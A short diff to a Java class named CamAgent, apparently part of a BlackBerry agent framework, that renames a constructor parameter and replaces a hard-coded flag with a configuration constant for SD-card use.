@@ -10,6 +10,7 @@
 package blackberry.agent;
 
 import blackberry.Status;
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
@@ -28,8 +29,8 @@ public final class CamAgent extends Agent {
      * @param agentStatus
      *            the agent status
      */
-    public CamAgent(final boolean agentStatus) {
-        super(Agent.AGENT_CAM, agentStatus, true, "CamAgent");
+    public CamAgent(final boolean agentEnabled) {
+        super(Agent.AGENT_CAM, agentEnabled, Conf.AGENT_CAM_ON_SD, "CamAgent");
     }
 
     /**
